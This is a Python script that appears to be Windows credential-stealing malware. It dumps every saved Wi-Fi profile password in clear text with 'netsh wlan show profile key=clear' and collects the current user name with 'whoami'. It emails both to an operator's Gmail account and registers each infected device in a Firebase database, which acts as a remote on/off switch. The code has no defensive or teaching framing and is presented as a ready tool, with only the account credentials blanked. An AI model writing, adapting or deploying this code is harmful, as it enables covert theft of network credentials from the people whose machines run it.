from time import sleep
from datetime import datetime
import pyrebase, subprocess, smtplib, os,base64 ,http.client as httplib 


internetCheack   : bool   = False
sendingMail      : bool   = False
looperPer        : bool   = False
runningPermition : bool   = False
DeviceName=""
DeviceId=""

db_credi ={
    "apiKey": "",
    "authDomain": "",
    "projectId": "",
    "storageBucket": "",
    "messagingSenderId": "",
    "appId": "",
    "measurementId": "",
    "databaseURL":""
    } 

class mainprocess: 
    def __init__(self): #internet check
        global internetCheack
        url="google.com"
        timeout=3
        connection = httplib.HTTPConnection(url,timeout=timeout)
        try:
            connection.request("HEAD", "/")
            connection.close() 
            internetCheack = True
            
        except Exception as exep:
            internetCheack = False
            
        	
        
    def autoRun(self): #running Permission check
        global runningPermition , looperPer
        try:
            
            db = pyrebase.initialize_app(db_credi)

            dbcon = db.database()
            data = dbcon.child("/runner").get().val()
            data =dict(data)
            runningPermition= data.get("run")
            looperPer = data.get("looping")
        except Exception as e:
            print("e")
        if not(looperPer) :
            data = dbcon.child("/runner").update({"run":False})
            # dbcon.update(data)
            
        
        
        
    def send_email(self,SUB,DATA): #send data to my email
        global sendingMail
        DATAs = 'Subject: {}\n\n{}'.format(SUB, DATA)
        try:
            emaill = "your email"
            passW = "app password"
            server=smtplib.SMTP("smtp.gmail.com",587)
            server.starttls()
            server.login(emaill,passW)
            server.sendmail(emaill,emaill,DATAs)
            server.quit()
            sendingMail = True
        except:
            sendingMail = False
        
        
        
    def wifi_gather(self): #gather wifi keys
        wifiInfo = subprocess.check_output(["netsh", "wlan", "show", "profile"],shell=True)
        deviceinfo = subprocess.check_output(["whoami"],shell=True)
        data=""
        star = "*************************************************************************************************************************************************************************************************************************"
        for x in range(2,len(wifiInfo.decode().split(":"))):
            data=data+subprocess.check_output(["netsh", "wlan", "show", "profile",wifiInfo.decode().split(":")[x].replace("All User Profile","").replace("\r\n","").strip(),"key=clear"]).decode()+star+"**************************************** \n\n"
        return data,deviceinfo


class routeChange:
    def __init__(self) -> None:
        global DeviceName,DeviceId
        if (os.path.exists("runner.txt")):
            starting_optins().mainRunner()
            
        else:
            try:
                DeviceName = subprocess.check_output(["whoami"],shell=True)
                db = pyrebase.initialize_app(db_credi)
                dbcon = db.database()
                data = dbcon.child("/device").push({
                    "usr":str(DeviceName.decode()),
                    "last date": str(datetime.now())
                })
                
                dbdata=dbcon.child("/device").get().val()
                listdt = list(dbdata)
                DeviceId = listdt[len(listdt)-1]
                print(DeviceId)
                with open("runner.txt","w") as file:
                    file.write((base64.b64encode(DeviceName)).decode())
                    file.write("\n"+DeviceId)
                starting_optins().installer_runner()
            except Exception as e:
                print(e)
                
                
    def dateupdater(self):
        with open("runner.txt","r") as file:
                Fdata = file.read().split("\n")
                DeviceName = base64.b64decode(Fdata[0].encode()).decode()
                DeviceId = Fdata[1]
                try:
                    db = pyrebase.initialize_app(db_credi)
                    dbcon = db.database()
                    data = dbcon.child("/device").get().val()
                    data =dict(data)
                    for x in data :
                        if x ==DeviceId:
                            dbcon.child("/device/{}".format(DeviceId)).update({
                                'last date':str(datetime.now())
                            })
                except Exception as e:
                    print("e")



class starting_optins:
    def mainRunner(self):
        runner = mainprocess()
        runner.autoRun()
        if runningPermition:
            runner.send_email(runner.wifi_gather()[1].decode(),"{}\n\n".format(datetime.now())+runner.wifi_gather()[0])
    
    def installer_runner(self):
        runner = mainprocess()
        runner.send_email(runner.wifi_gather()[1].decode(),"{}\n\n".format(datetime.now())+runner.wifi_gather()[0])
        routeChange().dateupdater()

if __name__=="__main__": #starting point
    while not(internetCheack) :
        sleep(5.5)
        runner = mainprocess()
    if internetCheack:
        routeChange()